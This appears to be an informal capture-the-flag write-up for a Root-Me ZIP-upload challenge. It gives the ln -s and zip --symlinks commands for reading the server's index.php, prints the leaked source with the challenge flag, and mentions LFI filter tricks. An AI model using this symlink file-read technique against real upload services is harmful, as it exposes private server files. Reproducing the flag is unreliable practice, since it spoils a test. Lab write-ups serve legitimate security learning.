# File upload - ZIP(To infilterate the index.php, ln -s)

Your goal is to read index.php file.

then make the file named index.php

```
<?php
phpinfo()
?>
```

then zip it

└─$ zip 1.zip index.php adding: index.php (stored 0%)

and I upload it to server

but not works intead showing error message -> 403 Forbidden nginx with the url http://challenge01.root-me.org/web-serveur/ch51/tmp/upload/63147da0463997.95864597/ -> then I need to go back to **ch51** directory, **for the index.php must exist in that directory**: ../../../ -> so make symbolic link to index.php which is 3 directories far from uploaded directory:

`ln -s ../../../index.php index.txt`

compress with zip then:

`zip --symlinks index.zip index.txt`

***

```
<?php
if(isset($_FILES['zipfile'])){
    if($_FILES['zipfile']['type']==="application/zip" || $_FILES['zipfile']['type']==="application/x-zip-compressed" || $_FILES['zipfile']['type']==="application/octet-stream"){
        $uploaddir = 'tmp/upload/'.uniqid("", true).'/';
        mkdir($uploaddir, 0750, true);
        $uploadfile = $uploaddir . md5(basename($_FILES['zipfile']['name'])).'.zip';
        if (move_uploaded_file($_FILES['zipfile']['tmp_name'], $uploadfile)) {
            $message = "<p>File uploaded</p> ";
        }
        else{
            $message = "<p>Error!</p>";
        }
	
        $zip = new ZipArchive;
        if ($zip->open($uploadfile)) {
            // Don't know if this is safe, but it works, someone told me the flag is N3v3r_7rU5T_u5Er_1npU7 , did not understand what it means
            exec("/usr/bin/timeout -k2 3 /usr/bin/unzip '$uploadfile' -d '$uploaddir'", $output, $ret);
            $message = "<p>File unzipped <a href='".$uploaddir."'>here</a>.</p>";
	    $zip->close();
        }
	else{
		$message = "<p> Decompression Error </p>";
	}
    }
    else{
		
	$message = "<p> Error bad file type ! <p>";
    }

}
?>

<html>
    <body>
        <h1>ZIP upload</h1>
        <?php print $message; ?>
        <form enctype="multipart/form-data" method="post" action>
            <input name="zipfile" type="file">
            <button type="submit">Submit</button>
        </form>
    </body>
</html>
```

***

**then probably use 'die' for passing 'assert' based filter. and use base64 filter too, to lfi or infilterate.**

you can use this for config.php too. but the problem is, should the compressed unzip itself??

if no need to zip, then probably just upload: ln -s ../../../index.php index.txt
